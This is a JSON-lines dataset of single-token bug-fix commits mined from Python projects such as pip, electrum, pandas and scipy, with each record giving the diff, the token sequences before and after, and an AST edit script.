{"project": "vmware-nsx", "commit_sha": "6ce9ede8cf49e2a83edb19c5d18503ba60c695a5", "parent_sha": "7c8c169578bb82c654d10a0648dc8c23bd90a88b", "file_path": "neutron/tests/unit/agent/linux/test_ovs_lib.py", "project_url": "https://github.com/gkotton/vmware-nsx", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -972,6 +972,6 @@ class TestDeferredOVSBridge(base.BaseTestCase):\n         with ovs_lib.DeferredOVSBridge(self.br) as deferred_br:\n             self.assertEqual(self.br.add_port, deferred_br.add_port)\n \n-    def test_getattr_unallowed_attr(self):\n+    def test_getattr_unallowed_attr_failure(self):\n         with ovs_lib.DeferredOVSBridge(self.br) as deferred_br:\n             self.assertRaises(AttributeError, getattr, deferred_br, 'failure')\n", "before": "def test_getattr_unallowed_attr ( self ) : with ovs_lib . DeferredOVSBridge ( self . br ) as deferred_br : self . assertRaises ( AttributeError , getattr , deferred_br , 'failure' )", "after": "def test_getattr_unallowed_attr_failure ( self ) : with ovs_lib . DeferredOVSBridge ( self . br ) as deferred_br : self . assertRaises ( AttributeError , getattr , deferred_br , 'failure' )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:test_getattr_unallowed_attr\", 3, 9, 3, 36], \"test_getattr_unallowed_attr_failure\"]]"}
{"project": "fail2ban", "commit_sha": "954075449d2dc70d05c7036c067e3b98eca11d25", "parent_sha": "e52790073dead706ad132ced2c5e2ac143559542", "file_path": "fail2ban/server/server.py", "project_url": "https://github.com/yarikoptic/fail2ban", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -71,7 +71,7 @@ class Server:\n \t\tlogSys.debug(\"Caught signal %d. Exiting\" % signum)\n \t\tself.quit()\n \t\n-\tdef __sigUSR1Handler(self, signum, fname):\n+\tdef __sigUSR1handler(self, signum, fname):\n \t\tlogSys.debug(\"Caught signal %d. Flushing logs\" % signum)\n \t\tself.flushLogs()\n \n", "before": "def __sigUSR1Handler ( self , signum , fname ) : logSys . debug ( \"Caught signal %d. Flushing logs\" % signum ) self . flushLogs ( )", "after": "def __sigUSR1handler ( self , signum , fname ) : logSys . debug ( \"Caught signal %d. Flushing logs\" % signum ) self . flushLogs ( )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:__sigUSR1Handler\", 3, 6, 3, 22], \"__sigUSR1handler\"]]"}
{"project": "django-lfs", "commit_sha": "306f3a3c81390e0d19d4c87516ba309d0a6f97f1", "parent_sha": "01d16287f5786337b662544d70b6b7c103c7cf49", "file_path": "lfs/manage/views/product/variants.py", "project_url": "https://github.com/baffolobill/django-lfs", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -59,7 +59,7 @@ class DefaultVariantForm(ModelForm):\n         super(DefaultVariantForm, self).__init__(*args, **kwargs)\n         instance = kwargs.get(\"instance\")\n \n-        choices = [(None, \"------\")]\n+        choices = [(\"\", \"------\")]\n         choices.extend([(v.id, \"%s (%s)\" % (v.get_name(), v.variant_position)) for v in instance.variants.all()])\n \n         self.fields[\"default_variant\"].choices = choices\n", "before": "choices = [ ( None , \"------\" ) ]", "after": "choices = [ ( \"\" , \"------\" ) ]", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"tuple\", 3, 20, 3, 36], [\"string:\\\"\\\"\", \"T\"], 1], [\"Delete\", [\"none:None\", 3, 21, 3, 25]]]"}
{"project": "django-lfs", "commit_sha": "5a1c9e38340f0399254bdc26c33becf6aac0a663", "parent_sha": "9a55d1b123ea58812cd0c454481c807632206388", "file_path": "lfs/catalog/tests.py", "project_url": "https://github.com/baffolobill/django-lfs", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -880,7 +880,7 @@ class CategoryTestCase(TestCase):\n         # c111 should have it's own one now\n         self.assertEqual(self.c111.get_image().title, \"Image 3\")\n \n-    def get_parents(self):\n+    def test_get_parents(self):\n         \"\"\"\n         \"\"\"\n         self.assertEqual(self.c1.get_parents(), [])\n", "before": "def get_parents ( self ) : \"\"\"\n         \"\"\" self . assertEqual ( self . c1 . get_parents ( ) , [ ] )", "after": "def test_get_parents ( self ) : \"\"\"\n         \"\"\" self . assertEqual ( self . c1 . get_parents ( ) , [ ] )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:get_parents\", 3, 9, 3, 20], \"test_get_parents\"]]"}
{"project": "pandas", "commit_sha": "8dc3c1940b624861a531f4666bb2a988c0ceea8b", "parent_sha": "52a032a6bf9b6ef69148e7419ac5f63afbab5138", "file_path": "pandas/io/data.py", "project_url": "https://github.com/jonathanrocher/pandas", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1143,7 +1143,7 @@ class Options(object):\n         try:\n             links = root.xpath('.//*[@id=\"yfncsumtab\"]')[0].xpath('.//a')\n         except IndexError:\n-            return RemoteDataError('Expiry months not available')\n+            raise RemoteDataError('Expiry months not available')\n \n         month_gen = (element.attrib['href'].split('=')[-1]\n                  for element in links\n", "before": "return RemoteDataError ( 'Expiry months not available' )", "after": "raise RemoteDataError ( 'Expiry months not available' )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"block\", 3, 13, 3, 66], [\"raise_statement\", \"N0\"], 0], [\"Insert\", \"N0\", [\"raise:raise\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 20, 3, 66], 1], [\"Delete\", [\"return:return\", 3, 13, 3, 19]], [\"Delete\", [\"return_statement\", 3, 13, 3, 66]]]"}
{"project": "QtChordii", "commit_sha": "097d649813d09ec16d90be32082c452e98b9a4bf", "parent_sha": "a15086d3714267a2e0d8c040c674cbb413aac2d2", "file_path": "main.py", "project_url": "https://github.com/joharei/QtChordii", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -333,7 +333,7 @@ class MainForm(QtGui.QMainWindow):\n                 self.tr(\"It seems this file is in the tab format.\\n\" + \"Do you want to convert it to the ChordPro format?\"),\n                 QMessageBox.Yes | QMessageBox.No, QMessageBox.Yes)\n             if res is QMessageBox.No:\n-                pass\n+                return\n             self.ui.textEdit.setText(tab2ChordPro(self.ui.textEdit.toPlainText()))\n \n if __name__ == \"__main__\":\n", "before": "pass", "after": "return", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"block\", 3, 17, 3, 21], [\"return_statement\", \"N0\"], 0], [\"Insert\", \"N0\", [\"return:return\", \"T\"], 0], [\"Delete\", [\"pass:pass\", 3, 17, 3, 21]], [\"Delete\", [\"pass_statement\", 3, 17, 3, 21]]]"}
{"project": "beba-ctrl", "commit_sha": "569756639b79549ea78c363209486f0d05704ab7", "parent_sha": "cdf42180a62a36d729d76a9093cfb5792ada3b56", "file_path": "ryu/ofproto/ofproto_v1_3_parser.py", "project_url": "https://github.com/beba-eu/beba-ctrl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1390,7 +1390,7 @@ class OFPQueueProp(OFPQueuePropHeader):\n \n     @staticmethod\n     def register_queue_property(property_, len_):\n-        def _register_property(cls):\n+        def _register_queue_property(cls):\n             cls.cls_property = property_\n             cls.cls_len = len_\n             OFPQueueProp._QUEUE_PROP_PROPERTIES[cls.cls_property] = cls\n", "before": "def _register_property ( cls ) : cls . cls_property = property_ cls . cls_len = len_ OFPQueueProp . _QUEUE_PROP_PROPERTIES [ cls . cls_property ] = cls", "after": "def _register_queue_property ( cls ) : cls . cls_property = property_ cls . cls_len = len_ OFPQueueProp . _QUEUE_PROP_PROPERTIES [ cls . cls_property ] = cls", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:_register_property\", 3, 13, 3, 31], \"_register_queue_property\"]]"}
{"project": "beba-ctrl", "commit_sha": "65aba138643cbefc7175b3013c2807c22e21c001", "parent_sha": "4f94ae8c2becbf1d4f1a0b4b722ac5737c4515cf", "file_path": "ryu/ofproto/ofproto_v1_0_parser.py", "project_url": "https://github.com/beba-eu/beba-ctrl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -410,7 +410,7 @@ class NXActionHeader(object):\n         self.vendor = ofproto_v1_0.NX_VENDOR_ID\n         self.subtype = subtype_\n \n-    def serialise(self, buf, offset):\n+    def serialize(self, buf, offset):\n         msg_pack_into(ofproto_v1_0.OFP_ACTION_HEADER_PACK_STR,\n                       buf, offset, self.type, self.len)\n \n", "before": "def serialise ( self , buf , offset ) : msg_pack_into ( ofproto_v1_0 . OFP_ACTION_HEADER_PACK_STR , buf , offset , self . type , self . len )", "after": "def serialize ( self , buf , offset ) : msg_pack_into ( ofproto_v1_0 . OFP_ACTION_HEADER_PACK_STR , buf , offset , self . type , self . len )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:serialise\", 3, 9, 3, 18], \"serialize\"]]"}
{"project": "beba-ctrl", "commit_sha": "c78d174a63556452b4578417baeab7823fd49889", "parent_sha": "0c7b42a174ab2514e3e23f922addf9f464c45815", "file_path": "ryu/ofproto/ofproto_v1_3_parser.py", "project_url": "https://github.com/beba-eu/beba-ctrl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -2647,7 +2647,7 @@ class OFPQueueGetConfigRequest(MsgBase):\n         super(OFPQueueGetConfigRequest, self).__init__(datapath)\n         self.port = port\n \n-    def _serialized_body(self):\n+    def _serialize_body(self):\n         msg_pack_into(ofproto_v1_3.OFP_QUEUE_GET_CONFIG_REQUEST_PACK_STR,\n                       self.buf, ofproto_v1_3.OFP_HEADER_SIZE, self.port)\n \n", "before": "def _serialized_body ( self ) : msg_pack_into ( ofproto_v1_3 . OFP_QUEUE_GET_CONFIG_REQUEST_PACK_STR , self . buf , ofproto_v1_3 . OFP_HEADER_SIZE , self . port )", "after": "def _serialize_body ( self ) : msg_pack_into ( ofproto_v1_3 . OFP_QUEUE_GET_CONFIG_REQUEST_PACK_STR , self . buf , ofproto_v1_3 . OFP_HEADER_SIZE , self . port )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:_serialized_body\", 3, 9, 3, 25], \"_serialize_body\"]]"}
{"project": "python-swjsq", "commit_sha": "1be0fb8223902fa6b9f6324ba15b9223250feb5e", "parent_sha": "414bbf107814c09d8b9e14c7e0fe2a24bdc548cd", "file_path": "swjsq.py", "project_url": "https://github.com/timothyqiu/python-swjsq", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -112,7 +112,7 @@ def get_mac(nic = '', to_splt = ':'):\n                 return _[0].replace(splt, to_splt)\r\n     except:\r\n         pass\r\n-    return ret\r\n+    return '000000000000004V'\r\n \r\n MAC = get_mac(to_splt = '').upper() + '004V'\r\n \r\n", "before": "return ret", "after": "return '000000000000004V'", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"return_statement\", 3, 5, 3, 15], [\"string:'000000000000004V'\", \"T\"], 1], [\"Delete\", [\"identifier:ret\", 3, 12, 3, 15]]]"}
{"project": "tomes-tagger", "commit_sha": "df817140d019e7ac5a0659be280e58ec7997c1e9", "parent_sha": "b30e9090793ac249d93117c654b8d55b2730c8cd", "file_path": "lib/eaxs_to_tagged.py", "project_url": "https://github.com/StateArchivesOfNorthCarolina/tomes-tagger", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -220,7 +220,7 @@ def main(eaxs_file):\n \n     def mark(s):\n         html, nlp = \"HTML > NLP\", \"Text > NLP\"\n-        if s[:len(nlp)] == \"Text > NLP\":\n+        if s[:len(nlp)] == nlp:\n             return html # HTML conversion was run.\n         else:\n             return nlp # HTML conversion was not run.\n", "before": "if s [ : len ( nlp ) ] == \"Text > NLP\" : return html else : return nlp", "after": "if s [ : len ( nlp ) ] == nlp : return html else : return nlp", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 12, 3, 40], [\"identifier:nlp\", \"T\"], 2], [\"Delete\", [\"string:\\\"Text > NLP\\\"\", 3, 28, 3, 40]]]"}
{"project": "ubuntu-tweak", "commit_sha": "9f94a3ea3462ee2961d48d2f3f8326bd0e697351", "parent_sha": "516e8fd2dcf2ffb4e033a6da0b6d101b12ab946a", "file_path": "ubuntutweak/tweaks/unity.py", "project_url": "https://github.com/muzena/ubuntu-tweak", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -63,7 +63,7 @@ class UnitySettings(TweakModule):\n                                              texts=(_('Never'), _('Auto Hide'),\n                                                     _('Dodge Window'), _('Dodge Active Window')),\n                                              values=(0, 1, 2, 3),\n-                                             type='int',\n+                                             type=int,\n                                              backend=\"compiz\",\n                                              enable_reset=True),\n                 ))\n", "before": "type = 'int' ,", "after": "type = int ,", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"expression_list\", 3, 51, 3, 57], [\"identifier:int\", \"T\"], 0], [\"Delete\", [\"string:'int'\", 3, 51, 3, 56]]]"}
{"project": "models", "commit_sha": "1f21b69e4921c17b5cf7410e6a49f88096eb3a7e", "parent_sha": "bd86e960df8bfd5457c32b7768ff5dfbc4ce917d", "file_path": "official/utils/misc/distribution_utils.py", "project_url": "https://github.com/cshallue/models", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -42,7 +42,7 @@ def get_distribution_strategy(num_gpus, all_reduce_alg=None):\n       return tf.contrib.distribute.MirroredStrategy(\n           num_gpus=num_gpus,\n           cross_tower_ops=tf.contrib.distribute.AllReduceCrossTowerOps(\n-              all_reduce_alg, num_packs=num_gpus))\n+              all_reduce_alg, num_packs=2))\n     else:\n       return tf.contrib.distribute.MirroredStrategy(num_gpus=num_gpus)\n \n", "before": "return tf . contrib . distribute . MirroredStrategy ( num_gpus = num_gpus , cross_tower_ops = tf . contrib . distribute . AllReduceCrossTowerOps ( all_reduce_alg , num_packs = num_gpus ) )", "after": "return tf . contrib . distribute . MirroredStrategy ( num_gpus = num_gpus , cross_tower_ops = tf . contrib . distribute . AllReduceCrossTowerOps ( all_reduce_alg , num_packs = 2 ) )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 31, 3, 49], [\"integer:2\", \"T\"], 2], [\"Delete\", [\"identifier:num_gpus\", 3, 41, 3, 49]]]"}
{"project": "electrum", "commit_sha": "ca4473c6201390a99a72d473c8f368b2b507d501", "parent_sha": "4c1bc141044edfb95b9f06503b43019d5b502d95", "file_path": "lib/wallet.py", "project_url": "https://github.com/UnitedBitcoin/electrum", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -290,7 +290,7 @@ class Wallet:\n         self.num_zeros = 0\n         self.master_public_key = ''\n         self.conversion_currency = None\n-        self.theme = None\n+        self.theme = \"Cleanlook\"\n \n         # saved fields\n         self.use_encryption = False\n", "before": "self . theme = None", "after": "self . theme = \"Cleanlook\"", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 26], [\"string:\\\"Cleanlook\\\"\", \"T\"], 2], [\"Delete\", [\"none:None\", 3, 22, 3, 26]]]"}
{"project": "electrum", "commit_sha": "1d5f04c58840196f96e1a7f1a7a4969f6386da7d", "parent_sha": "aa7f056d02c62590cbac2a8e64e310571c5b46bb", "file_path": "lib/commands.py", "project_url": "https://github.com/UnitedBitcoin/electrum", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -278,7 +278,7 @@ class Commands:\n         if r:\n             return {'address':r[0]}\n \n-    def createrawtransaction(self, inputs, outputs):\n+    def createrawtx(self, inputs, outputs):\n         coins = self.wallet.get_spendable_coins(exclude_frozen = False)\n         tx_inputs = []\n         for i in inputs:\n", "before": "def createrawtransaction ( self , inputs , outputs ) : coins = self . wallet . get_spendable_coins ( exclude_frozen = False ) tx_inputs = [ ] for i in inputs : ", "after": "def createrawtx ( self , inputs , outputs ) : coins = self . wallet . get_spendable_coins ( exclude_frozen = False ) tx_inputs = [ ] for i in inputs : ", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:createrawtransaction\", 3, 9, 3, 29], \"createrawtx\"]]"}
{"project": "electrum", "commit_sha": "0af700bda04afaffd48143d44664226328df53dc", "parent_sha": "a220932711f2bdc015d698ef67510fbfcd533d54", "file_path": "lib/wallet.py", "project_url": "https://github.com/UnitedBitcoin/electrum", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1724,7 +1724,7 @@ class Multisig_Wallet(Deterministic_Wallet):\n             self.keystores[name] = load_keystore(self.storage, name)\n         self.keystore = self.keystores['x1/']\n         xtype = deserialize_xpub(self.keystore.xpub)[0]\n-        self.txin_type = 'p2sh' if xtype == 'standard' else 'xtype'\n+        self.txin_type = 'p2sh' if xtype == 'standard' else xtype\n \n     def save_keystore(self):\n         for name, k in self.keystores.items():\n", "before": "self . txin_type = 'p2sh' if xtype == 'standard' else 'xtype'", "after": "self . txin_type = 'p2sh' if xtype == 'standard' else xtype", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"conditional_expression\", 3, 26, 3, 68], [\"identifier:xtype\", \"T\"], 4], [\"Delete\", [\"string:'xtype'\", 3, 61, 3, 68]]]"}
{"project": "electrum", "commit_sha": "9286deca5752354f1ef516b72e755f4ed330d319", "parent_sha": "63a1db117282eb5526f5ef55b4bc720ae820fdde", "file_path": "lib/tests/test_bitcoin.py", "project_url": "https://github.com/UnitedBitcoin/electrum", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -66,7 +66,7 @@ class Test_bitcoin(unittest.TestCase):\n         assert xprv == \"xprvA2nrNbFZABcdryreWet9Ea4LvTJcGsqrMzxHx98MMrotbir7yrKCEXw7nadnHM8Dq38EGfSh6dqA9QWTyefMLEcBYJUuekgW4BYPJcr9E7j\"\n \n     def _do_test_bip32(self, seed, sequence):\n-        xprv, xpub = bip32_root(bfh(seed), 0)\n+        xprv, xpub = bip32_root(bfh(seed), 'standard')\n         assert sequence[0:2] == \"m/\"\n         path = 'm'\n         sequence = sequence[2:]\n", "before": "xprv , xpub = bip32_root ( bfh ( seed ) , 0 )", "after": "xprv , xpub = bip32_root ( bfh ( seed ) , 'standard' )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 32, 3, 46], [\"string:'standard'\", \"T\"], 3], [\"Delete\", [\"integer:0\", 3, 44, 3, 45]]]"}
{"project": "bCNC-4axis", "commit_sha": "eb19ae91359583e9b7e8c4ab252c7447ad70b4ea", "parent_sha": "ac4428bfd4cba3733b36f6f7b4c5af37a3588e2b", "file_path": "bCNC.py", "project_url": "https://github.com/dguerizec/bCNC-4axis", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1486,7 +1486,7 @@ class Application(Toplevel,Sender):\n \t#-----------------------------------------------------------------------\n \t# Inner loop to catch any generic exception\n \t#-----------------------------------------------------------------------\n-\tdef _monitorSerial(self):\n+\tdef monitorSerial(self):\n \t\tinserted = False\n \n \t\t# Check serial output\n", "before": "def _monitorSerial ( self ) : inserted = False", "after": "def monitorSerial ( self ) : inserted = False", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:_monitorSerial\", 3, 6, 3, 20], \"monitorSerial\"]]"}
{"project": "dat-banana-bot", "commit_sha": "29f237d6acd37b811d0d5e7a898957ae134e7289", "parent_sha": "f57caf0dbfec58b88f9da76e940b76d75e75df2d", "file_path": "cogs/music.py", "project_url": "https://github.com/bananaboy21/dat-banana-bot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -208,7 +208,7 @@ class Music:\n             reaction, user = await self.bot.wait_for('reaction_add', check=lambda reaction, user: user == ctx.author)\n             if reaction.emoji == '\u2795':\n                 if player.volume > 100:\n-                    return # Ignore volumes that are greater than 100\n+                    break # Ignore volumes that are greater than 100\n                 await player.set_volume(player.volume + 5)\n                 try:\n                     await msg.remove_reaction(\"\\U00002795\", ctx.author)\n", "before": "return", "after": "break", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"block\", 3, 21, 3, 70], [\"break_statement\", \"N0\"], 0], [\"Insert\", \"N0\", [\"break:break\", \"T\"], 0], [\"Delete\", [\"return:return\", 3, 21, 3, 27]], [\"Delete\", [\"return_statement\", 3, 21, 3, 27]]]"}
{"project": "PyFVCOM", "commit_sha": "36f998ff2088b508a10133a49f03a9a77b4cc07d", "parent_sha": "c66ea9a55e2be2a1d995cb8282cfd0326fe55007", "file_path": "grid_tools.py", "project_url": "https://github.com/changnick/PyFVCOM", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -496,7 +496,7 @@ def plotUnstructuredGridProjected(triangles, nodes, x, y, z, colourLabel, addTex\n     plt.show()\n \n \n-def findNearestPoint(FX, FY, x, y, maxDistance=0.0):\n+def findNearestPoint(FX, FY, x, y, maxDistance=True):\n", "before": "def findNearestPoint ( FX , FY , x , y , maxDistance = 0.0 ) : ", "after": "def findNearestPoint ( FX , FY , x , y , maxDistance = True ) : ", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 36, 3, 51], [\"true:True\", \"T\"], 2], [\"Delete\", [\"float:0.0\", 3, 48, 3, 51]]]"}
{"project": "sunpy", "commit_sha": "40c2f1913ed3076e0cb0588bb75458f79da9d488", "parent_sha": "77b7406628da73166ab90b58fd53784c3b2fc024", "file_path": "sunpy/time/time.py", "project_url": "https://github.com/ayshih/sunpy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -260,7 +260,7 @@ def day_of_year(time_string):\n     time_diff = time - datetime(time.year, 1, 1, 0, 0, 0)\n     return time_diff.days + time_diff.seconds / SECONDS_IN_DAY + 1\n \n-def break_time(t=None, time_format=''):\n+def break_time(t='now', time_format=''):\n     \"\"\"Given a time returns a string. Useful for naming files.\"\"\"\n     #TODO: should be able to handle a time range\n     return parse_time(t, time_format).strftime(\"%Y%m%d_%H%M%S\")\n", "before": "def break_time ( t = None , time_format = '' ) : \"\"\"Given a time returns a string. Useful for naming files.\"\"\" return parse_time ( t , time_format ) . strftime ( \"%Y%m%d_%H%M%S\" )", "after": "def break_time ( t = 'now' , time_format = '' ) : \"\"\"Given a time returns a string. Useful for naming files.\"\"\" return parse_time ( t , time_format ) . strftime ( \"%Y%m%d_%H%M%S\" )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 16, 3, 22], [\"string:'now'\", \"T\"], 2], [\"Delete\", [\"none:None\", 3, 18, 3, 22]]]"}
{"project": "jamiecurle", "commit_sha": "408245dbb5e57f952ec49080d5418eb9b7dd96af", "parent_sha": "054f0cd66421246e24bc9e97a55e2dbc092c884f", "file_path": "apps/ultra/migrations/0004_auto__del_exerciseset__add_workout__add_movement__del_field_exercise_n.py", "project_url": "https://github.com/dedaluz/jamiecurle", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -31,7 +31,7 @@ class Migration(SchemaMigration):\n         db.delete_column('ultra_exercise', 'name')\n \n         # Adding field 'Exercise.workout'\n-        db.add_column('ultra_exercise', 'workout', self.gf('django.db.models.fields.related.ForeignKey')(default='A', to=orm['ultra.Workout']), keep_default=False)\n+        db.add_column('ultra_exercise', 'workout', self.gf('django.db.models.fields.related.ForeignKey')(default=1, to=orm['ultra.Workout']), keep_default=False)\n \n         # Adding field 'Exercise.movement'\n         db.add_column('ultra_exercise', 'movement', self.gf('django.db.models.fields.related.ForeignKey')(default=1, to=orm['ultra.Movement']), keep_default=False)\n", "before": "db . add_column ( 'ultra_exercise' , 'workout' , self . gf ( 'django.db.models.fields.related.ForeignKey' ) ( default = 'A' , to = orm [ 'ultra.Workout' ] ) , keep_default = False )", "after": "db . add_column ( 'ultra_exercise' , 'workout' , self . gf ( 'django.db.models.fields.related.ForeignKey' ) ( default = 1 , to = orm [ 'ultra.Workout' ] ) , keep_default = False )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 106, 3, 117], [\"integer:1\", \"T\"], 2], [\"Delete\", [\"string:'A'\", 3, 114, 3, 117]]]"}
{"project": "pip", "commit_sha": "c26b6de89795186b88bf612f0f3229476ac402a4", "parent_sha": "bea1f6ca2f6e0eda0a58e623096d391167008bd8", "file_path": "pip/wheel.py", "project_url": "https://github.com/takluyver/pip", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -29,7 +29,7 @@ def wheel_setuptools_support():\n \n-    installed_distribute = installed_setuptools = None\n+    installed_distribute = installed_setuptools = ''\n     try:\n         installed_distribute = pkg_resources.get_distribution('distribute')\n     except pkg_resources.DistributionNotFound:\n", "before": "installed_distribute = installed_setuptools = None", "after": "installed_distribute = installed_setuptools = ''", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"assignment\", 1, 28, 1, 55], [\"string:''\", \"T\"], 2], [\"Delete\", [\"none:None\", 1, 51, 1, 55]]]"}
{"project": "python_utilities", "commit_sha": "d17005b1856f06ef4410455576de88f96a3d1fe7", "parent_sha": "373edf4689da0929f05a0da63ffcdad9c7fb9f4d", "file_path": "booleans/boolean_helper.py", "project_url": "https://github.com/jonathanmorgan/python_utilities", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -28,7 +28,7 @@ class BooleanHelper( object ):\n     \n         # return reference\n-        value_OUT = \"\"\n+        value_OUT = False\n         \n         # declare variables\n         value_cleaned = \"\"\n", "before": "value_OUT = \"\"", "after": "value_OUT = False", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"assignment\", 2, 9, 2, 23], [\"false:False\", \"T\"], 2], [\"Delete\", [\"string:\\\"\\\"\", 2, 21, 2, 23]]]"}
{"project": "pip", "commit_sha": "70c42ad26e0f0e91a0bb75b8a00b0c5f4f73f48f", "parent_sha": "98152717379c80df83cb75ea1fa9d832716ee10c", "file_path": "tests/unit/test_wheel.py", "project_url": "https://github.com/takluyver/pip", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -53,7 +53,7 @@ def test_uninstallation_paths():\n \n class TestWheelFile(object):\n \n-    def test_inavlid_filename_raises(self):\n+    def test_invalid_filename_raises(self):\n         with pytest.raises(InvalidWheelFilename):\n             w = wheel.Wheel('invalid.whl')\n \n", "before": "def test_inavlid_filename_raises ( self ) : with pytest . raises ( InvalidWheelFilename ) : w = wheel . Wheel ( 'invalid.whl' )", "after": "def test_invalid_filename_raises ( self ) : with pytest . raises ( InvalidWheelFilename ) : w = wheel . Wheel ( 'invalid.whl' )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:test_inavlid_filename_raises\", 3, 9, 3, 37], \"test_invalid_filename_raises\"]]"}
{"project": "scipy", "commit_sha": "468aa743ce0621eb40425db1f94630958a6f21ab", "parent_sha": "164571ec078ef8f69c55b238c130f23cdd28d2e7", "file_path": "scipy/io/tests/test_mmio.py", "project_url": "https://github.com/GregoryEAllen/scipy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -243,7 +243,7 @@ class TestMMIOCoordinate(TestCase):\n         b = mmread(fn).todense()\n         assert_array_almost_equal(a,b)\n \n-    def test_read_symmetric(self):\n+    def test_read_symmetric_pattern(self):\n         \"\"\"read a symmetric pattern matrix\"\"\"\n         fn = mktemp()\n         f = open(fn,'w')\n", "before": "def test_read_symmetric ( self ) : \"\"\"read a symmetric pattern matrix\"\"\" fn = mktemp ( ) f = open ( fn , 'w' )", "after": "def test_read_symmetric_pattern ( self ) : \"\"\"read a symmetric pattern matrix\"\"\" fn = mktemp ( ) f = open ( fn , 'w' )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:test_read_symmetric\", 3, 9, 3, 28], \"test_read_symmetric_pattern\"]]"}
{"project": "rbx1", "commit_sha": "f326d2621e11aa56f5a93cfc17051a716f5fd0fb", "parent_sha": "c70aaa09ed15345f6b9a30d45a6a4d8789be774f", "file_path": "rbx1_vision/src/rbx1_vision/ros2opencv2.py", "project_url": "https://github.com/tanishGarg/rbx1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -52,7 +52,7 @@ class ROS2OpenCV2(object):\n         self.show_features = rospy.get_param(\"~show_features\", True)\n         self.show_boxes = rospy.get_param(\"~show_boxes\", True)\n         self.flip_image = rospy.get_param(\"~flip_image\", False)\n-        self.feature_size = rospy.get_param(\"~feature_size\", False)\n+        self.feature_size = rospy.get_param(\"~feature_size\", 1)\n \n         # Initialize the Region of Interest and its publisher\n         self.ROI = RegionOfInterest()\n", "before": "self . feature_size = rospy . get_param ( \"~feature_size\" , False )", "after": "self . feature_size = rospy . get_param ( \"~feature_size\" , 1 )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 44, 3, 68], [\"integer:1\", \"T\"], 3], [\"Delete\", [\"false:False\", 3, 62, 3, 67]]]"}
